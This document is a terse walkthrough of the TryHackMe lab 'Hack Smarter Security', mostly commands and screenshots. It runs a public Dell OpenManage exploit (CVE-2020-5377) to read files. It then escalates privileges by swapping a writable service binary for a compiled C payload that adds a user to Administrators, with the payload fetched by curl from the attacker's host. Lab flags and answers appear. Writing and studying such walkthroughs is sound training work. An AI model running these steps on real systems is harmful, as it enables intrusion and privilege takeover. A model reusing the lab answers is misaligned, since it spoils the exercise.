### 23-Mar-24-Sat

[TryHackMe | Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/822b3b08-670c-4f68-b108-a1629138da88)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a13db521-7da8-4202-9fc3-c6eba70250fb)

```
ftp anonymous@hacksmarter.thm
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6b6b1042-c179-4479-9329-f10e39905d92)

https://0xb0b.gitbook.io/writeups/tryhackme/2024/hack-smarter-security#initial-foothold

https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py

```
python CVE-2020-5377.py 10.17.44.152 10.10.171.27:1311
```

```
C:\inetpub\wwwroot\application\web.config
```

```
C:\inetpub\wwwroot\hacksmartersec\web.config
```

```
C:\Windows\win.ini
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/536b34fa-04af-487a-a6f1-40f44e054c04)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a59e1e6c-019b-4515-9eee-e131179b4359)

```
THM{4ll15n0tw3llw1thd3ll}
```

https://jaxafed.github.io/posts/tryhackme-hack_smarter_security/#shell-as-tyler

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c489b025-5717-4961-84eb-5fd50423ddf2)

```
sc qc spoofer-scheduler
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6d2ab7a9-f9fb-4a25-bc54-d6eede868ede)

```
icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/be0ee078-a8ee-418f-90d2-9e45c4713fb9)

```
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}
```

```
x86_64-w64-mingw32-gcc-win32 payload.c -o payload.exe
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/e5592ea3-8509-413a-860c-0df304f7b497)

```
sc stop spoofer-scheduler
```

```
move spoofer-scheduler.exe spoofer-scheduler.exe.bak
```

```
curl http://10.17.44.152/payload.exe -o spoofer-scheduler.exe
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f597a472-ecdd-42e3-890c-cb2efef23dd6)

```
whoami /groups
```

type C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f09fc9d0-466f-44ae-a436-c0ee23a8359b)

```
CyberLens, WorkSmarter, SteelMountain
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b72e44ff-6134-44ea-8301-50caa3c93533)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b2b56066-98e9-4fe7-9c8c-acd7232f02da)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/3c329d78-28e7-47f9-94d7-811403afed47)

